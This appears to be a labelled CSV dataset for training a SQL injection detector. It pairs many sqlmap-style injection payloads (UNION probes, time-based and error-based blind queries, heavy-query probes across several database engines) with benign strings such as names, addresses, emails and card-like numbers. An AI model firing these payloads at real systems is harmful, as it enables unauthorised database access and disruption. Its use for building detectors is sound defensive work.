payload,label
"-2255 UNION ALL SELECT 6525,6525,6525,6525,6525,6525,6525,6525-- KRid",1
"select pg_sleep ( 5 )  and  ( ""tpry"" = ""tpry",1
kukier policastro,0
-8324')) OR 2634=2634%16,1
"1%' and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
e7tearina,0
suan,0
off,0
"-7982""))) UNION ALL SELECT 3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873,3873#",1
86090489v,0
""" OR SLEEP(5) AND ""MFXS""=""MFXS",1
07408152j,0
"DtRW' IN BOOLEAN MODE) AND CHAR(111)||CHAR(104)||CHAR(89)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL)--",1
teq0io,0
sexC+(SELECT ASCII_CHAR(97)||ASCII_CHAR(83)||ASCII_CHAR(112)||ASCII_CHAR(120) WHERE 7498=7498 AND 6479=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 6479 WHEN 6479 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)))+,1
"sqlmap/1.4.4#stable (http://sqlmap.org)"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
94046799y,0
nona,0
""" WHERE 4786=4786 AND 3546=DBMS_PIPE.RECEIVE_MESSAGE(CHR(81)||CHR(75)||CHR(75)||CHR(97),5)--",1
"'))) OR 3992=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('jzPK' LIKE 'jzPK",1
"callejon sur, 93 13-c",0
olaya,0
76914964c,0
Great. Have a safe trip. Dont panic surrender all.,0
"-1043"") where 4207=4207 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1
1498074049868909,0
atab?a6ad7,0
arjan,0
paragon.calithness@callalelaboca.be,0
kaylil,0
"c/ madrid, 53 5-f",0
country,0
"') AS iTml WHERE 7228=7228 AND 4189=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)--",1
"') WHERE 6202=6202 AND CHAR(110)||CHAR(118)||CHAR(111)||CHAR(97)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7891),0),5000000000),NULL)--",1
aveinte,0
team,0
"+(SELECT 0x78706765 WHERE 5027=5027 AND ELT(3758=3758,SLEEP(5)))+",1
"1)) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1
hoel,0
2899893992206591,0
zumaran solsona,0
https://keystrokebiometrics.xyz:443/' RLIKE (SELECT 8494 FROM (SELECT(SLEEP(5)))Ldoj) OR 'MywO'='uYcV,1
16240,0
-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,1
"vyHv UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"vyHv"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1
6190977702118960,0
vyHv+(SELECT neYV WHERE 4965=4965 OR (SELECT 3249 FROM (SELECT(SLEEP(5)))RTsa)#,1
rolando,0
78608268h,0
eddier,0
"1"" or sleep(5)",1
vUXo')) AS fuVL WHERE 2142=2142 OR 9890=(SELECT 9890 FROM PG_SLEEP(5))--,1
kingslan,0
09107,0
"cbHd,(SELECT * FROM GENERATE_SERIES(2460,2460,CASE WHEN (2460=9094) THEN 1 ELSE 0 END) LIMIT 1)",1
"-8700"" OR 2232=(ASCII_CHAR(113)||ASCII_CHAR(118)||ASCII_CHAR(112)||ASCII_CHAR(113)||ASCII_CHAR(113)||(SELECT CASE 2232 WHEN 2232 THEN 1 ELSE 0 END FROM RDB$DATABASE)||ASCII_CHAR(113)||ASCII_CHAR(106)||ASCII_CHAR(120)||ASCII_CHAR(106)||ASCII_CHAR(113)) AND ""wHUL"" LIKE ""wHUL",1
"vyHv'||(SELECT CHAR(103)||CHAR(81)||CHAR(77)||CHAR(122) FROM DUAL WHERE 2726=2726 OR CHAR(98)||CHAR(99)||CHAR(85)||CHAR(69)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(4737),0),5000000000),NULL)--",1
scheuerm,0
I'm ok. Will do my part tomorrow,0
"TAAm')) AND (SELECT (CASE WHEN (7384=1749) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7384) END) FROM DUAL) IS NULL AND (('iELE'='iELE",1
")) AS uNqR WHERE 7781=7781 OR 4706=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)-- ZIcB",1
vyHv'));SELECT (CASE WHEN (9956=5864) THEN 9956 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL--,1
"cbHd` WHERE 3676=3676 (SELECT (CASE WHEN (3376=3376) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) ELSE CHAR(107)||CHAR(73)||CHAR(109)||CHAR(117) END) FROM (VALUES(0)))-- qlHj",1
"sexC""))) AND 7174=BENCHMARK(5000000,MD5(0x78415667)) AND (((""GsRG""=""GsRG",1
02005072r,0
"sqlmap/1.4.4#stable (http://sqlmap.org)"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"sqlmap/1.4.4#stable (http://sqlmap.org)') AND CHAR(104)||CHAR(116)||CHAR(110)||CHAR(100)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(7756),0),5000000000),NULL)--",1
Are there TA jobs available? Let me know please cos i really need to start working,0
emerald,0
26081986,0
5936907680257741,0
-5075)) AS Hxne WHERE 4503=4503 ORDER BY 1-- QULC,1
pe4iclitar,0
mirambell donet,0
1 )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( 7015 = 7015,1
"sqlmap/1.4.4#stable (http://sqlmap.org)) WHERE 9879=9879 AND (SELECT 6762 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(6762=6762,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yyUi",1
greenhalgh@cafedeteatro.np,0
"https://keystrokebiometrics.xyz:443/"" WHERE 2064=2064 AND ELT(7447=7447,SLEEP(5))#",1
23591,0
05217,0
132435,0
holoubek@hojainformativas.ua,0
cazoln,0
kotaku,0
cbHd';SELECT (CASE WHEN (9739=8170) THEN 9739 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL--,1
"')) UNION ALL SELECT NULL,NULL#",1
soguillo,0
sqlmap/1.4.4#stable (http://sqlmap.org)||(SELECT CHR(88)||CHR(103)||CHR(81)||CHR(71) WHERE 8296=8296 AND 4436=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (4436=4436) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)))||,1
Happy valentines day I know its early but i have hundreds of handsomes and beauties to wish. So i thought to finish off aunties and uncles 1st...,0
"https://keystrokebiometrics.xyz:443/' AND 5784=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'uDKF'='uDKF",1
"') OR ELT(6429=6429,SLEEP(5))#",1
zlotnick,0
kellard@todobetis.gf,0
3556606130011191,0
-6303))) OR 6604=7118%16,1
cbHd AND 5677=7074# bcID,1
"https://keystrokebiometrics.xyz:443/""))) AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(6503=6503,1))),0x716a786a71)) USING utf8))) AND (((""GKGd""=""GKGd",1
") AS QfTo WHERE 2995=2995 OR EXTRACTVALUE(1432,CONCAT(0x5c,0x7176707171,(SELECT (ELT(1432=1432,1))),0x716a786a71))-- lxHP",1
maritza5,0
I guess you could be as good an excuse as any lol.,0
")) AND 1862=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
vyHv) AS crgW WHERE 1046=1046 UNION ALL SELECT NULL#,1
') AS Ixkn WHERE 4797=4797 AND 6123=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (6123=6123) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))-- qqHH,1
"calle alonso nuez 186, 12?b",0
""")) OR (SELECT 2635 FROM (SELECT(SLEEP(5)))MZfF) AND ((""vRQJ"" LIKE ""vRQJ",1
"-3306'))) UNION ALL SELECT 8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703,8703#",1
bonner,0
"WHERE 8310=8310 AND 1862=(SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000))--",1
Delhi and chennai still silent.,0
") WHERE 6427=6427 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7176707171,(SELECT (ELT(9615=9615,1))),0x716a786a71,0x78))x))-- uAjX",1
"https://keystrokebiometrics.xyz:443/"") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
1894425536151221,0
91494736t,0
46145,0
"sexC"") AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7176707171,(SELECT (ELT(6110=6110,1))),0x716a786a71)) USING utf8))) AND (""Xbzz""=""Xbzz",1
osada,0
"DtRW UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
"-1969"")) UNION ALL SELECT 8193,8193,8193,8193,8193,8193,8193,8193,8193,8193,8193#",1
yasmin,0
"vyHv) OR CHAR(103)||CHAR(72)||CHAR(78)||CHAR(114)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND (6637=6637",1
"1')) as nuku where 7009=7009 union all select null,null,null,null,null#",1
matula,0
cus motj,0
WHERE 1818=1818 AND 5179=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (5179=5179) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC)-- mbDs,1
9457153149790079,0
gravity,0
pomeroy5,0
"vyHv"") OR 4765=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(119)||CHR(84)||CHR(108),5) AND (""lWWO""=""lWWO",1
"))) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hjTz",1
16522,0
dirt,0
sexC'||(SELECT (CHR(75)||CHR(67)||CHR(117)||CHR(109)) WHERE 1314=1314 AND 2774=CAST((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (2774=2774) THEN BITCOUNT(BITSTRING_TO_BINARY((CHR(49)))) ELSE BITCOUNT(BITSTRING_TO_BINARY((CHR(48)))) END))::varchar||(CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)) AS NUMERIC))||',1
"') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
""" AND 6506=9452#",1
S but mostly not like that.,0
"-4468"") OR 8503=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (8503=8503) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (""tWvV"" LIKE ""tWvV",1
https://keystrokebiometrics.xyz:443/) AS nyii WHERE 2725=2725 AND 4763 IN (SELECT (CHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (4763=4763) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(120)+CHAR(106)+CHAR(113)))-- kieD,1
"TAAm"")) AS gZFh WHERE 9573=9573 AND CHAR(76)||CHAR(79)||CHAR(118)||CHAR(70)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(2511),0),5000000000),NULL)--",1
wesselhoft,0
61126872w,0
"calle xiquets de valls, 138, 5?g",0
"sexC"")) AS VhEK WHERE 6547=6547 PROCEDURE ANALYSE(EXTRACTVALUE(8278,CONCAT(0x5c,(BENCHMARK(5000000,MD5(0x68645865))))),1)-- RATf",1
') AND 2100=DBMS_UTILITY.SQLID_TO_SQLHASH((CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (2100=2100) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113))) AND ('qQwy' LIKE 'qQwy,1
"vyHv)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- artT",1
05051991,0
"vyHv') AS gVDQ WHERE 4428=4428 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
-6217)) as hyws where 3441=3441 or 9421=4695#,1
mitjans,0
"""))) AND 2406=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(118)||CHR(112)||CHR(113)||CHR(113)||(SELECT (CASE WHEN (2406=2406) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(120)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (((""AXXn""=""AXXn",1
uytterlinden@lamolahotel.ro,0
toba,0
"sexC"" WHERE 6311=6311 AND 5900=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)-- Szpn",1
"-6898'))) UNION ALL SELECT 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030,9030-- UfRM",1
mead-neudorfer4@joyclub.au,0
88684338h,0
cbHd`) WHERE 6000=6000 AND (6256=1419)*1419-- rLNo,1
"-5473"")) UNION ALL SELECT 5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173,5173-- HKKm",1
"' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
pouira@maridosadomicilio.ec,0
Haven't found a way to get another app for your phone eh ? Will you go to the net cafe ? Did you take that job? Geeee I need you babe. I crave to see you ...,0
"-1877""))) UNION ALL SELECT 3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969,3969-- gzLI",1
U're welcome... Caught u using broken english again...,0
"vyHv)) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
sant jordi/san jorge,0
"TAAm' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
manquel,0
dohanos_boulting@am-si.zw,0
"cbHd'||(SELECT CHAR(99)+CHAR(111)+CHAR(118)+CHAR(78) WHERE 4329=4329 OR 6467=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7))||'",1
"av. benisa 43, 10d",0
quest@palmatraducciones.pw,0
"sqlmap/1.4.4#stable (http://sqlmap.org)) AND 1180=LIKE(CAST(X'41424344454647' AS TEXT),UPPER(HEX(RANDOMBLOB(500000000/2))))-- XeEa",1
"DtRW"")(SELECT (CASE WHEN (1271=1271) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(1271),0),500000000),NULL) ELSE CHAR(98)||CHAR(103)||CHAR(85)||CHAR(68) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS) AND (""mryh""=""mryh",1
"-4179' UNION ALL SELECT 8426,8426,8426,8426,8426,8426,8426,8426,8426#",1
?carburador,0
"-7409""  )  )   union all select 3145,3145,3145--",1
"c/ fray junipero serra, 127",0
"1')));select count(*) from generate_series(1,5000000) and ((('ldqq'='ldqq",1
"sqlmap/1.4.4#stable (http://sqlmap.org)') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
7192,0
2i7c2ar,0
https://keystrokebiometrics.xyz:443/`) WHERE 5380=5380 AND 4373=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)--,1
vauxhall,0
"-7053"") AS UOrc WHERE 9576=9576 UNION ALL SELECT 9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576,9576-- uuha",1
sant vicen de torell,0
"1'))) and elt(4249=4249,7259) and ((('ujcx'='ujcx",1
vUXo'));SELECT (CASE WHEN (1218=3581) THEN 1218 ELSE 1/(SELECT 0) END)--,1
"-2291'))) UNION ALL SELECT 8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075,8075#",1
celso,0
"DtRW)) OR (SELECT 9466 FROM(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(9466=9466,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ((8766=8766",1
"cbHd` WHERE 6008=6008 OR ELT(3027=3027,SLEEP(5))#",1
""") WHERE 4952=4952 AND CHAR(119)||CHAR(111)||CHAR(98)||CHAR(109)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(5637),0),5000000000),NULL)-- elaq",1
"-9680"") UNION ALL SELECT 3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378,3378-- VmYY",1
florian@alcantarapartners.so,0
woolwine0,0
46704601l,0
TAAm' IN BOOLEAN MODE);IF(4412=2644) SELECT 4412 ELSE DROP FUNCTION hFEf--,1
adjurable,0
"sexC) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",1
lenguarada,0
ezequiel,0
01121988,0
"vyHv' AND ROW(3972,2085)>(SELECT COUNT(*),CONCAT(0x7176707171,(SELECT (ELT(3972=3972,1))),0x716a786a71,FLOOR(RAND(0)*2))x FROM (SELECT 3952 UNION SELECT 3417 UNION SELECT 2678 UNION SELECT 7525)a GROUP BY x)-- jpEt",1
enris6rar,0
montanuy,0
AND 3375=7487%16,1
causa,0
"1 )  and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"-2698') UNION ALL SELECT 3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875,3875#",1
dalejr,0
marcolino,0
12131213,0
aldehuela de yeltes,0
6040888757825695,0
phelpr@eonon.com.pr,0
"-4681"")) UNION ALL SELECT 1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083,1083-- BRFe",1
28530,0
neleo,0
9875693785507781,0
"vyHv"")) OR 2646=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR) AND ((""vDnK""=""vDnK",1
